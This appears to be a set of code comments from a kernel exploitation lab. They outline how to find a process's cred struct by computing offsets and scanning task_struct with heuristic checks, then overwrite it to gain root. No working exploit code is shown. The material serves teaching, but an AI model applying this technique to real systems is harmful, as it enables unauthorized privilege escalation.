    // 1.  Read kernel source code and compute the exact offset. 
    //     You will need to look at the .config file under kernel dir to resolve some macros
    // 2.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 3.  Scan from thread_info->task to find the location of cred field
    //     HINT: here are some conditions to help: 
    //         task->cpu_timers[i] >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->cpu_timers[i]->next == task->cpu_timers[i]->prev (Because we never set any cpu timer)
    //         task->cpu_timers[i]->next >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->real_cred == task->cred (Because we never used seteuid() system call)
    //         task->cred->uid == getuid()
    
    // Finally, you will need to rewrite the cred struct and give your process highest privilege
